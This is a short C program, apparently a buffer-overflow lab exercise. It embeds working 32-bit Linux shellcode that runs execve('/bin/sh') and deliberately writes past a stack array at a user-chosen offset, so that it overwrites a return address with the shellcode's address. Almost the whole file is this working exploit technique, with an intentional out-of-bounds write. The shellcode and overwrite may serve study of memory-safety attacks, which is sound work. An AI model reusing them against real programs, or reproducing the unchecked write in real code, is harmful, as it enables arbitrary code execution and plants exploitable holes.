#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int test()
{
    printf("test start ...\n");
    int i;
    unsigned int stack[10];
    char my_str[16];
    printf("addr of shellcode in decimal: %d\n", &shellcode);
    for (i = 0; i < 10; i++)
        stack[i] = 0;
/*
    while (1) {
        printf("index of item to fill: (-1 to quit): ");
        scanf("%d",&i);
        if (i == -1) {
            break;
        }
        printf("value of item[%d]:", i);
        scanf("%d",&stack[i]);
    }*/
     
    printf("number of sizeof(int) you want to override: (-1 to quit): ");
    scanf("%d",&i);
    if (i != -1)
      memset(stack, 0, (10+i) * sizeof(unsigned int));
    *(void**)(stack+10+i) = &shellcode;

    printf("test end\n");

    return 0;
}

int test1()
{
	printf("test1 start \n");
	test();
	printf("test1 end...\n");
	return 0;
}

int main()
{
    test1();
    printf("Overflow Failed\n");

    return 0;
}
